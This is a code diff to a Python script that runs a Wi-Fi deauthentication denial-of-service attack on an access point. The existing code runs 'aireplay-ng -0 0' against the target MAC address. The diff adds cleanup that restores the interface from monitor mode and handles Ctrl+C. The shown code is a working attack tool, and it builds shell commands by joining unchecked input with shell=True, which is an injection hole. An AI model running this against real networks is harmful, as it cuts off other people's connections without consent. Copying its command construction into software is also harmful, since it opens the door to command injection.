@@ -25,11 +25,34 @@ def put_to_monitorMode(iface, channel):
             print(line)
     return
 
+def turn_off_monitorMode(iface):
+    print("[*]Closing script...\n")
+    cmd = ["ifconfig "+iface+" down",
+           "iwconfig "+iface+" mode managed",
+           "ifconfig "+iface+" up",
+           "service networking restart",
+           "service network-manager start"]
+
+    
+    for c in cmd:
+        try:
+            s1 = subprocess.Popen(c,shell=True, stdout = subprocess.PIPE, stderr=subprocess.STDOUT)
+            
+            for line in io.TextIOWrapper(s1.stdout, encoding = "utf-8"):
+                print(line)
+        except Exception as err:
+            print(err)
+
+    return
+    
 
 def perform_denial(mac,iface,channel):
-    print("Performing attack!!!\n To stop press CTR+D")
 
     put_to_monitorMode(iface, channel)
+
+    print("Performing attack!!!\n To stop press CTR+D")
+
+    
 
     cmd=["aireplay-ng -0 0 -a "+mac+" "+iface]
 
@@ -89,9 +112,15 @@ def main():
 
     print("Mac Address of AP: %s\nOn channel: %i\nInterface: %s"%(mac_address,int(channel),interface))
 
-    perform_denial(mac_address, interface, channel)
-    return
+    try:
+        perform_denial(mac_address, interface, channel)
+        
+    except KeyboardInterrupt:
+        turn_off_monitorMode(interface)
 
+        print("\nGoodbye...")
+        sys.exit(2)
+        
 
 if __name__=="__main__":
     main()
